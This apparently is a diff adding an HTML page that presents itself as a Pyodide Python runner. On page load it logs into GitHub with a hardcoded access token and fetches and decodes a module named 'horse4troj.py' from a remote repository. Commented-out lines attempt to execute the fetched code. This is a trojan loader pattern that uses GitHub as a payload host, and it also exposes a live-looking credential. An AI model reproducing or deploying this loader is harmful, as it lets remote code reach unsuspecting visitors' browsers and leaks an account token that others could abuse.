@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Run Python Script with Pyodide</title>
+    <script src="https://cdn.jsdelivr.net/pyodide/v0.26.0/full/pyodide.js"></script>
+</head>
+
+<body>
+    <div id="output"></div>
+    <script>
+        async function runPythonScript() {
+      const pyodide = await loadPyodide();
+
+      try {
+        // Fetch the Python script from the server
+        await pyodide.loadPackage("ssl")
+        await pyodide.loadPackage("micropip");
+        const micropip = pyodide.pyimport("micropip");
+        await micropip.install("github3.py");
+        const fs = pyodide.fs;
+        const sys = pyodide.sys;
+        console.log(pyodide.runPython(`
+        import os
+        import sys
+        import github3
+        import base64
+        def github_connect():
+          user = 'kingkalito'
+          token = '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'
+          session = github3.login(token=token)
+          return session.repository(user, 'rain_em_fire')                
+        def get_file_contents(module_name, repo):
+          return repo.file_contents(f"{module_name}").content
+        def make_req():        
+          repo = github_connect()
+          config_json = get_file_contents('horse4troj.py',repo)
+          config = base64.b64decode(config_json).decode('utf-8')
+          return config
+        `));
+        //fs.writeFileSync(pyFile, pythonCode);
+        //import ${pyFile.replace('.py', '')}
+        // Execute the Python script
+        const output = pyodide.runPython(`make_req()`);
+        //console.log(pyodide.runPython(output));
+        //pyodide.code.CodeRunner(output);
+        //pyodide.eval_code(output)
+        // Display the output in the HTML
+        document.getElementById('output').innerText = output;
+      } catch (error) {
+        console.error('Error running Python script:', error);
+        document.getElementById('output').textContent = 'An error occurred while running the Python script.';
+      }
+    }
+
+    runPythonScript();
+    </script>
+
+</body>
+
+</html>
